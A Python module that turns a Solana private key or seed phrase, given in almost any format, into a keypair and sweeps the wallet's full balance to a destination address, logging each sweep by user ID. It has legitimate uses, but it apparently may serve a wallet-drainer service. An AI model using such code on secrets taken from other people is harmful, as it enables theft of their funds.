from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import transfer, TransferParams
from solana.rpc.api import Client
from solana.rpc.types import TxOpts
from solders.transaction import Transaction
from config import SOLANA_RPC_URL
import base58

client = Client(SOLANA_RPC_URL)

LAMPORTS_PER_SOL = 1_000_000_000
MIN_RENT_EXEMPT = 890880
FEE_BUFFER = 10000

def keypair_from_secret(secret: str) -> Keypair:
    s = secret.strip()
    if "," in s:
        return Keypair.from_bytes(bytes(map(int, s.split(","))))
    try:
        raw = base58.b58decode(s)
        if len(raw) == 64:
            return Keypair.from_bytes(raw)
        if len(raw) == 32:
            return Keypair.from_seed(raw)
    except Exception:
        pass
    if " " in s:
        try:
            import hashlib, hmac
            from mnemonic import Mnemonic
            mnemo = Mnemonic("english")
            seed = mnemo.to_seed(s)[:32]
            return Keypair.from_seed(seed)
        except Exception:
            pass
    return Keypair.from_bytes(bytes.fromhex(s))

def get_balance(address: str) -> float:
    try:
        pubkey = Pubkey.from_string(address)
        lamports = client.get_balance(pubkey).value
        return lamports / LAMPORTS_PER_SOL
    except Exception:
        return 0.0

def forward(secret: str, destination: str, user_id: int) -> dict:
    result = {"chain": "solana", "status": "skip", "amount": 0.0, "tx_hash": None, "error": None}
    try:
        keypair = keypair_from_secret(secret)
        from_pubkey = keypair.pubkey()
        to_pubkey = Pubkey.from_string(destination)

        balance = client.get_balance(from_pubkey).value
        send_amount = balance - MIN_RENT_EXEMPT - FEE_BUFFER

        if send_amount <= 0:
            result["error"] = f"Balance {balance/LAMPORTS_PER_SOL:.6f} SOL too low"
            return result

        amount_sol = send_amount / LAMPORTS_PER_SOL
        blockhash = client.get_latest_blockhash().value.blockhash

        tx = Transaction.new_signed_with_payer(
            [transfer(TransferParams(from_pubkey=from_pubkey, to_pubkey=to_pubkey, lamports=send_amount))],
            payer=from_pubkey,
            signing_keypairs=[keypair],
            recent_blockhash=blockhash,
        )

        resp = client.send_transaction(tx, opts=TxOpts(skip_confirmation=False, preflight_commitment="confirmed"))
        tx_sig = str(resp.value)

        result["status"] = "success"
        result["amount"] = amount_sol
        result["tx_hash"] = tx_sig
        print(f"[SOL] Swept {amount_sol:.6f} SOL -> {destination[:10]}... sig={tx_sig[:16]}... user={user_id}")
        return result

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        print(f"[SOL ERROR] user={user_id}: {e}")
        return result
